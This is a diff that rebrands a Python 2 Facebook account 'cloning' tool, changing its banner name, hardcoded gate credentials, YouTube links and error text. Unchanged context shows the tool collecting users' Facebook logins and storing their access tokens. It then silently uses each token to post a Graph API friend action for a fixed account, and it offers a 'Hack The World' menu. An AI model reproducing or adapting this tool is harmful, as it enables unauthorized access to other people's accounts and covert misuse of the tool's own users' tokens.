@@ -84,7 +84,7 @@ print  """︱︱︱ ┏┓︱︱ ︱︱︱︱ ︱︱︱︱ ︱︱
 \033[1;97m┏╋╋┓ ┃┃┃┃ ┃┏┓┃ ┃┃┃┃ ┃┃
 \033[1;97m┗┛┗┛ ┗┛┗┛ ┗┛┗┛ ┗┛┗┛ ┗┛"""
 
-jalan("\033[1;96m•◈•────────────•◈•\033[1;99mKashiGangster\033[1;99m•◈•────────────•◈•")                        
+jalan("\033[1;96m•◈•────────────•◈•\033[1;99mZ____K\033[1;99m•◈•────────────•◈•")                        
 jalan("\033[1;96m  ___ _    __   __  _  ___  ___ ")  
 jalan("\033[1;96m┏━━━┓ ┏┓︱┏┓ ┏━━━┓ ┏━━┓
 jalan("\033[1;96m
@@ -98,15 +98,15 @@ jalan("\033[1;96m┏┛┗┛┃ ┃┗━┛┃ ┃┃┃┗┓ ┏┫┣┓
 jalan("\033[1;96m
 jalan("\033[1;96m┗━━━┛ ┗━━━┛ ┗┛┗━┛ ┗━━┛
 
-      
+     
   
 jalan("\033[1;97m INDIAN USER USE ANY PROXY TO CLONE")
 jalan("\033[1;97m WIFI USER USE ANY PROXY TO CLONE")
-jalan("\033[1;93m Welcome to Kashi Gangster")
-jalan("\033[1;96m•◈•──────────•◈•\033[1;96mKashiGangster\033[1;96m•◈•──────────•◈•")
+jalan("\033[1;93m Welcome to Z K TECH")
+jalan("\033[1;96m•◈•──────────•◈•\033[1;96mZ____K\033[1;96m•◈•──────────•◈•")
 
-CorrectUsername = "Cloner"
-CorrectPassword = "kashigangster"
+CorrectUsername = "duri"
+CorrectPassword = "lovezk"
 
 loop = 'true'
 while (loop == 'true'):
@@ -119,10 +119,10 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "\033[1;96mWrong Password"
-            os.system('xdg-open https://www.youtube.com/channel/UCUJSOqxjU4f9npLso-10Fuw')
+            os.system('xdg-open https://m.youtube.com/channel/UChfXBYlQ3qW6KJQpIH601uA')
     else:
         print "\033[1;96mWrong Username"
-        os.system('xdg-open https://www.youtube.com/channel/UCUJSOqxjU4f9npLso-10Fuw')
+        os.system('xdg-open https://m.youtube.com/channel/UChfXBYlQ3qW6KJQpIH601uA')
 
 def login():
 	os.system('clear')
@@ -133,7 +133,7 @@ def login():
 		os.system('clear')
 		print logo
 		print 42*"\033[1;96m="
-		print('\033[1;96m[⚡] \x1b[1;93mLogin your new id \x1b[1;93m[⚡]' )
+		print('\033[1;96m[⚡] \x1b[1;93mLogin with new id \x1b[1;93m[⚡]' )
 		id = raw_input('\033[1;963m[+] \x1b[0;34mEnter ID/Email \x1b[1;93m: \x1b[1;93m')
 		pwd = raw_input('\033[1;93m[+] \x1b[0;34mEnter Password \x1b[1;93m: \x1b[1;93m')
 		tik()
@@ -163,19 +163,19 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\033[1;96m[✓] \x1b[1;92mLogin Hogai'
-				os.system('xdg-open https://www.youtube.com/channel/UCUJSOqxjU4f9npLso-10Fuw')
+				os.system('xdg-open https://m.youtube.com/channel/UChfXBYlQ3qW6KJQpIH601uA')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
 				print"\n\033[1;96m[!] \x1b[1;91mTidak ada koneksi"
 				keluar()
 		if 'checkpoint' in url:
-			print("\n\033[1;96m[!] \x1b[1;91mAisa lagta hai apka account checkpoint pe hai")
+			print("\n\033[1;96m[!] \x1b[1;91mCHECKPOINT ISSUE")
 			os.system('rm -rf login.txt')
 			time.sleep(1)
 			keluar()
 		else:
-			print("\n\033[1;96m[!] \x1b[1;91mPassword/Email ghalat hai")
+			print("\n\033[1;96m[!] \x1b[1;91mPassword/Email PROBLEM")
 			os.system('rm -rf login.txt')
 			time.sleep(1)
 			login()
@@ -216,7 +216,7 @@ def menu():
 	print "   \033[1;36;40m      ║\033[1;36;40m[*] Subs\033[1;34;40m: "+sub+"                      \033[1;36;40m║"
 	print "   \033[1;36;40m      ╚═════════════════════════════════╝"
 	print "\033[1;32;40m[1] \033[1;33;41mHack The World"	
-	print "\033[1;32;40m[2] \033[1;33;42mUpdate Kashi Gangster"																														
+	print "\033[1;32;40m[2] \033[1;33;42mUpdate Z K TECH"																														
 	print "\033[1;32;40m[0] \033[1;33;43mLog out"
 	pilih()
 	
